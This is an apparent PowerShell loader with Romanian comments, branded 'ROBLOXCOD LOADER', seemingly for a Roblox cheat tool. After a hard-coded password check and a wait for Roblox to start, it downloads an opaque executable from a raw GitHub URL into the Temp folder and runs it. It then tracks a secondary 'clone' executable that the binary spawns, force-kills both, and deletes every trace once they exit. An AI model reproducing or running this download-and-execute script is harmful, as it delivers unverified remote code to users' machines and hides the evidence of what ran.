# =========================================================
# PARTEA I: Autentificare si Verificare Roblox
# =========================================================
$password = Read-Host "Introdu parola"

switch ($password) {
    "fun.regele" {
        Write-Host "[+] Parola acceptata."
    }

    "robloxcod" {
        Write-Host "[+] Verific daca Roblox este deschis..."

        while (-not (Get-Process -Name "RobloxPlayerBeta" -ErrorAction SilentlyContinue)) {
            Write-Host "Deschide Roblox pentru a continua..."
            Start-Sleep -Seconds 2
        }

        Write-Host "[+] Roblox este deschis. Continui..."
    }

    default {
        Write-Host "Parola gresita!"
        Pause
        exit
    }
}

# =========================================================
# PARTEA II: Descarcare si Rulare Aplicatie (Cu urmarire clona)
# =========================================================
Write-Host "==============================" -ForegroundColor Cyan
Write-Host "     ROBLOXCOD LOADER        " -ForegroundColor Blue
Write-Host "==============================" -ForegroundColor Cyan
Write-Host ""

$workDir = Join-Path $env:TEMP "ROBLOXCOD"
New-Item -ItemType Directory -Force -Path $workDir | Out-Null

$exeName = "loaders.exe"
$exeUrl  = "https://raw.githubusercontent.com/regeele478-glitch/supreme/main/loaders.exe" # Inlocuieste cu URL-ul tau real
$exePath = Join-Path $workDir $exeName

Write-Host "[+] Descarc $exeName..."
try {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -ErrorAction Stop
} catch {
    Write-Host "[-] Eroare la descarcare." -ForegroundColor Red
    Pause
    exit
}

# 1. Inregistram starea folderului Temp inainte de a porni loaderul
# Identificam ce executabile exista deja in Temp ca sa nu ne atingem de ele mai tarziu
$existingExes = Get-ChildItem -Path $env:TEMP -Filter "*.exe" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name

Write-Host "[+] Pornesc aplicatia..."
$process = Start-Process -FilePath $exePath -PassThru

# Asteptam 5 secunde ca loaderul sa isi creeze clona/procesul secundar in Temp
Write-Host "[*] Initializez modulele aplicatiei..."
Start-Sleep -Seconds 5

# 2. Identificam executabilul nou aparut (clona)
$newExes = Get-ChildItem -Path $env:TEMP -Filter "*.exe" -ErrorAction SilentlyContinue | 
           Where-Object { $existingExes -notcontains $_.Name }

$clonedExeName = ""
if ($newExes) {
    # Am gasit executabilul clona generat de loaders.exe
    $clonedExeName = [System.IO.Path]::GetFileNameWithoutExtension($newExes[0].Name)
    Write-Host "[+] Am detectat procesul secundar: $clonedExeName" -ForegroundColor Yellow
}

# Asteptam ca loaderul principal (sau clona) sa se inchida
Write-Host "[*] Aplicatia ruleaza. Scriptul va curata totul cand decizi sa o inchizi."
if ($clonedExeName) {
    # Daca am identificat clona, asteptam dupa ea
    $clonedProcess = Get-Process -Name $clonedExeName -ErrorAction SilentlyContinue
    if ($clonedProcess) {
        $clonedProcess.WaitForExit()
    }
} else {
    # Daca nu a aparut o clona diferita, asteptam procesul de baza
    $process.WaitForExit()
}

# Pentru siguranta, cand utilizatorul apasa o tasta sau cand procesul se termina, curatam tot
Write-Host ""
Write-Host "[*] Pornesc curatarea de siguranta..." -ForegroundColor Cyan

# 3. Inchidem fortat procesele identificate (daca au ramas agatate in memorie)
Stop-Process -Name "loaders" -Force -ErrorAction SilentlyContinue
if ($clonedExeName) {
    Stop-Process -Name $clonedExeName -Force -ErrorAction SilentlyContinue
}
Start-Sleep -Seconds 2

# 4. Stergem folderul de lucru si clona creata direct in Temp
if (Test-Path $workDir) {
    Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
}

if ($newExes) {
    foreach ($file in $newExes) {
        if (Test-Path $file.FullName) {
            Remove-Item $file.FullName -Force -ErrorAction SilentlyContinue
            Write-Host "[✔] Am sters clona ramasa: $($file.Name)" -ForegroundColor Green
        }
    }
}

Write-Host "[✔] Curatare completa finalizata cu succes!" -ForegroundColor Green
Pause